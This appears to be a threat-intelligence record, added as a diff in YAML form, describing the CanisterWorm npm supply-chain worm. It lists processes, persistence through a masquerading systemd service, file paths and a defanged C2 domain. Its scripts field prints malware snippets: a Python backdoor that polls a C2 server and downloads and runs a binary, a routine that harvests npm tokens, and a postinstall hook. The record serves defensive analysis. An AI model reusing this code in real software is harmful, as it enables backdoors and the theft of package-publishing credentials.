@@ -1,0 +1,72 @@
+title: 'CanisterWorm: How TeamPCP Turned the npm Ecosystem Into a Weapon'
+description: TeamPCP compromised Trivy (Aqua Security's vulnerability scanner) to
+  steal npm credentials, then deployed CanisterWorm, a self-propagating worm that
+  infected over 60 npm packages within 24 hours via a three-stage infection chain
+  consisting of a Node.js postinstall dropper, a Python backdoor, and a worm propagation
+  script.
+attribution: TeamPCP
+malware_families:
+- CanisterWorm
+cves: []
+ttps:
+  processes:
+  - node
+  - python3
+  - Runner.Worker
+  command_lines:
+  - node index.js
+  - systemctl --user stop pgmon
+  - systemctl --user disable pgmon
+  - systemctl --user daemon-reload
+  - npm config get
+  powershell: []
+  scripts:
+  - '"scripts": { "postinstall": "node index.js" }'
+  - "C_URL = \"REDACTED_C2_SERVER_URL\"\nTARGET = \"/tmp/pglog\"\ndef ping_c2_server():\n\
+    \    try:\n        req = urllib.request.Request(C_URL, headers={'User-Agent':\
+    \ 'Mozilla/5.0'})\n        with urllib.request.urlopen(...)\n    except:\n   \
+    \     return None\ndef download_and_execute_binary(url):\n    try:\n        urllib.request.urlretrieve(url,\
+    \ TARGET)\n        os.chmod(TARGET, 0o755)\n        subprocess.Popen([TARGET],\
+    \ stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)\n\
+    \    except:\n        pass\nif __name__ == \"__main__\":\n    time.sleep(300)\n\
+    \    while True:\n        binary_url = ping_c2_server()\n        if binary_url\
+    \ and \"youtube.com\" not in binary_url:\n            download_and_execute_binary(binary_url)\n\
+    \        time.sleep(3000)"
+  - "const tokens = findNpmTokens();\nif (tokens.length > 0) {\n    const deployScript\
+    \ = path.join(__dirname, 'scripts', 'deploy.js');\n    if (fs.existsSync(deployScript))\
+    \ {\n        spawn(process.execPath, [deployScript], {\n            detached:\
+    \ true,\n            stdio: 'ignore',\n            env: { ...process.env, NPM_TOKENS:\
+    \ tokens.join(',') },\n        }).unref();\n    }\n}"
+  registry_keys: []
+  image_loads: []
+  network_connections:
+  - service.py -> scan.aquasecurtiy[.]org
+  file_activity:
+  - ~/.local/share/pgmon/service.py
+  - ~/.config/systemd/user/pgmon.service
+  - /tmp/pglog
+  - /tmp/.pg_state
+  - ~/.npmrc
+  - /etc/npmrc
+  - ./npmrc
+  persistence:
+  - systemd user service created at ~/.config/systemd/user/pgmon.service with Restart=always,
+    masquerading as PostgreSQL monitoring tool (pgmon)
+  - Malware installs as systemd service without requiring root privileges, survives
+    reboots
+  process_relations:
+  - npm install -> node index.js
+  - node index.js -> service.py (Python backdoor)
+  - node index.js -> deploy.js
+iocs:
+  hashes: []
+  ip_addresses: []
+  domains:
+  - scan.aquasecurtiy[.]org
+  urls: []
+authors:
+- R. McCarthy
+- C. Eriksen
+reference: https://www.picussecurity.com/resource/blog/canisterworm-how-teampcp-turned-the-npm-ecosystem-into-a-weapon
+date_of_publication: June 04, 2026
+file_creation_date: June 04, 2026
